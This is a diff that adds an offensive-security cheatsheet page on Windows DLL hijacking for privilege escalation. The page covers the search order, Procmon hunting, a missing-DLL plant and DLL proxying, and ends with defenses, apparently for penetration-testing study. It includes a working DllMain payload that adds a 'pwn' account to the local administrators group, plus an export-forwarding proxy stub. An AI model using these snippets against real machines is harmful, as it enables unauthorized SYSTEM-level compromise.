@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DLL Hijacking · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>DLL Hijacking</h1><p class="cx-lede">Escalating by exploiting the Windows DLL search order - when a privileged process loads a DLL by name without a full path, plant a malicious DLL earlier in the search sequence and your code runs in that process&#x27;s context. Covers the safe/unsafe search order, finding hijackable loads with Procmon (NAME NOT FOUND / Load Image), the missing-DLL and DLL-proxying exploit shapes, and how this differs from DLL injection.</p><div class="cx-tags"><span class="cx-tag">MITRE T1574.001, T1574, T1068</span><span class="cx-tag">D3FEND D3-PSA, D3-FA</span><span class="cx-tag">IMPACT PrivEsc, SystemCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When a process loads a DLL <strong>by name</strong> rather than by full path, Windows walks a fixed search order to find it. If you can write a DLL into a directory that is searched <em>before</em> the legitimate one - or into a directory searched at all, for a DLL that is missing entirely - the privileged process loads your code and runs it in its own context. The privilege you gain is whatever the target runs as: hijack a service running as <code>LocalSystem</code> and you get <strong>SYSTEM</strong>; hijack an auto-elevating binary and you get the administrator's <strong>high-integrity</strong> token (not SYSTEM - that's a UAC bypass, see below).</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Watch what a target process loads (Sysinternals Procmon)
+#    Filter: Process Name is &lt;target&gt;.exe
+#    Filter: Result is NAME NOT FOUND  + Path ends with .dll   → missing DLL you can supply
+#    Filter: Operation is Load Image                            → DLLs loaded from writable dirs
+
+# 2a. Missing-DLL hijack: drop your DLL where the process looked and failed
+copy evil.dll &quot;C:\Program Files\App\x.dll&quot;
+
+# 2b. Search-order hijack: place your DLL earlier in the order than the real one
+#     (e.g. the application directory, if it&#x27;s writable, beats System32)
+
+# DllMain runs your payload on load - no exported function needed</code></pre></figure>
+<p>Success indicator: the target process loads your DLL - a beacon from <code>DllMain</code> fires, or a shell returns in the process's (ideally SYSTEM) context when the service/app next starts.</p>
+<h2 id="the-dll-search-order">The DLL search order</h2>
+<p>With <strong>Safe DLL Search Mode</strong> enabled (the default), a by-name load is resolved in this order:</p>
+<ol>
+<li>The directory the application loaded from</li>
+<li>The system directory (<code>C:\Windows\System32</code>)</li>
+<li>The 16-bit system directory (<code>C:\Windows\System</code>)</li>
+<li>The Windows directory (<code>C:\Windows</code>)</li>
+<li>The current directory</li>
+<li>The directories in the <code>PATH</code> environment variable</li>
+</ol>
+<p>With Safe mode <strong>disabled</strong> (<code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode = 0</code>), the <em>current directory</em> jumps up to position 2 - which widens the attack surface considerably.</p>
+<p>Two things are <em>necessary</em> for a hijack: a DLL requested by name (no absolute path), and a writable directory that appears in the search order at or before where the real DLL lives. They are not <em>sufficient</em> - the filesystem search above only runs after Windows has tried API sets, SxS/manifest redirection, modules already loaded in the process, and the <strong>KnownDLLs</strong> list. A KnownDLL (most of System32's core DLLs) is served from a protected section regardless of the search order, so planting one in a writable application directory does <strong>not</strong> override the system copy. So a writable application directory beats System32 <em>only for a DLL that isn't a KnownDLL and isn't otherwise redirected</em>; a writable <code>PATH</code> entry (the <code>%PATH%</code> abuse that also powers some <a href="../uac-bypass/index.html">UAC bypasses</a>) catches the tail. Always confirm against the target's actual load behaviour (next section) rather than assuming a writable directory is exploitable.</p>
+<h2 id="finding-a-hijackable-load">Finding a hijackable load</h2>
+<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a> (Sysinternals) is the primary tool - it records every file operation. Launch the target, then filter:</p>
+<ul>
+<li><strong><code>Result is NAME NOT FOUND</code> + <code>Path ends with .dll</code></strong> - the lead to chase, but read it carefully. A single <code>NAME NOT FOUND</code> is <em>one filesystem probe</em>, not the outcome of the whole lookup: a load routinely fails in the application directory and then <strong>succeeds</strong> in System32 a few lines later. Follow the complete lookup for that DLL - only if <em>every</em> probe fails is the DLL genuinely missing and plantable anywhere searched. If it succeeds somewhere, you can only hijack a writable directory that is searched <em>before</em> that successful hit; dropping it in a later <code>PATH</code> directory would never load.</li>
+</ul>
+<figure class="cx-code"><figcaption></figcaption><pre><code>main.exe  CreateFile  C:\Program Files\App\x.dll     NAME NOT FOUND   ← probe 1 failed
+main.exe  CreateFile  C:\Windows\System32\x.dll      SUCCESS          ← actually loaded here</code></pre></figure>
+<ul>
+<li><strong><code>Operation is Load Image</code></strong> - shows DLLs the process <em>did</em> load, and from where. A load out of a writable directory (an app dir with loose ACLs) is hijackable by replacing/preempting that file.</li>
+</ul>
+<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> (view a process's loaded DLLs) and PE-inspection tools (read a binary's import table) corroborate what a target needs. Pair the finding with an <a href="../weak-permissions/index.html">ACL check</a> on the candidate directory - the hijack only works if you can write there.</p>
+<h2 id="exploit-shapes">Exploit shapes</h2>
+<h3 id="missing-dll-plant-it">Missing DLL - plant it</h3>
+<p>The simplest case: the process looks for a DLL that doesn't exist. You don't need to preserve any functionality - just a <code>DllMain</code> that runs on load:</p>
+<figure class="cx-code"><figcaption>c</figcaption><pre><code class="language-c">BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // payload: add admin, spawn a reverse shell, run a beacon...
+        system(&quot;cmd.exe /c net localgroup administrators pwn /add&quot;);
+    }
+    return TRUE;
+}</code></pre></figure>
+<p>Compile to a DLL named exactly what the process sought (<code>x.dll</code> above), drop it in the searched-and-writable directory, and trigger the load (restart the service, or wait for the app to run).</p>
+<h3 id="dll-proxying-preserve-functionality">DLL proxying - preserve functionality</h3>
+<p>When you hijack a DLL the process genuinely uses, a bare <code>DllMain</code> breaks the app (the real exports vanish) and draws attention. <strong>Proxy</strong> instead: your DLL forwards every real export to a renamed copy of the original while adding your payload.</p>
+<figure class="cx-code"><figcaption>c</figcaption><pre><code class="language-c">// library.dll (yours). Rename the original to library.o.dll first.
+__declspec(dllexport) int Add(int a, int b) {
+    HMODULE orig = LoadLibraryA(&quot;library.o.dll&quot;);           // the real DLL
+    AddFunc realAdd = (AddFunc)GetProcAddress(orig, &quot;Add&quot;);
+    /* ...payload runs here... */
+    return realAdd(a, b);                                   // behaviour preserved
+}</code></pre></figure>
+<p>Rename the legitimate DLL (<code>library.dll</code> → <code>library.o.dll</code>) and install yours as <code>library.dll</code>. The app works normally; your code runs alongside. Tools like <strong>DLLSideloader</strong>/<code>SharpDllProxy</code> can generate the forwarding stubs automatically.</p>
+<h2 id="hijacking-vs-injection">Hijacking vs injection</h2>
+<p>Don't confuse DLL <em>hijacking</em> with DLL <em>injection</em> - they solve different problems:</p>
+<ul>
+<li><strong>Hijacking</strong> (this page) abuses the <em>search order</em> so a target loads your DLL <em>instead of / in place of</em> one it wanted. The privilege comes from the target process; no access to it is needed up front.</li>
+<li><strong>Injection</strong> forces your DLL into a process you already have a handle to - classically <code>OpenProcess</code> → <code>VirtualAllocEx</code> → <code>WriteProcessMemory</code> → <code>CreateRemoteThread</code> pointed at <code>LoadLibraryA</code>, or stealthier <strong>manual mapping</strong> / <strong>reflective</strong> loading that avoid <code>LoadLibrary</code> (and the APIs AV/EDR watch). Injection is a code-execution/evasion technique; it isn't itself a privilege boundary crossing unless you're injecting into a more-privileged process you already can open.</li>
+</ul>
+<p>For escalation, hijacking is the relevant one: it turns "I can write a file" into "code runs as the service/app."</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Load DLLs by <strong>fully-qualified path</strong>, and call <code>SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)</code> / build with <code>/DEPENDENTLOADFLAG</code> so the search can't wander.</li>
+<li>Keep Safe DLL Search Mode enabled (it is by default) - never set <code>SafeDllSearchMode = 0</code>.</li>
+<li>Lock application and <code>PATH</code> directories so unprivileged users can't write to anything in a privileged process's search order.</li>
+<li>Prefer signed DLLs with enforced signature checks for sensitive processes.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../weak-permissions/index.html">Weak service &amp; registry permissions</a> - the ACL weakness that makes a search-order directory writable</li>
+<li><a href="../uac-bypass/index.html">UAC bypass</a> - several UAC bypasses are DLL hijacks against auto-elevating binaries</li>
+<li><a href="../dnsadmins/index.html">DnsAdmins</a> - a server-side relative: loading an attacker DLL into the SYSTEM-context DNS service on a DC</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../vulnerable-services/index.html">Previous: Vulnerable Services</a><a class="cx-next" href="../uac-bypass/index.html">Next: UAC Bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
